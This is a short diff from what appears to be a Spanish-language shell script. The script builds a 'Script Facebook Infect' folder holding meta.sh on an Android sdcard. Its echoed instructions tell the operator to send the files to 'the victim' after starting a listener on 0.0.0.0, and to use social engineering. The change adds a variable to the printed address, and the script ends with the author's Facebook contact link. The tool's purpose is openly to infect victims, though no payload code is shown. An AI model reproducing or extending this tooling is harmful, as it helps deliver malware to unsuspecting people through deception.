@@ -191,7 +191,7 @@ cp meta.sh /sdcard/'Script Facebook Infect'
 echo ""
 setterm -foreground cyan
 echo "💀Se creo la carpeta Script Facebook Infect en su sdcard adentro estan los tres archivos"
-echo "💀Enviar a la victima despues de ejecutar el 0.0.0.0:"
+echo "💀Enviar a la victima despues de ejecutar el 0.0.0.0:$c"
 echo "💀Recuerda usar Ingeniera Social"
 echo -e "\e[1;37;41mContactame: https://m.facebook.com/Jimber.Cevallos\e[0m"
 
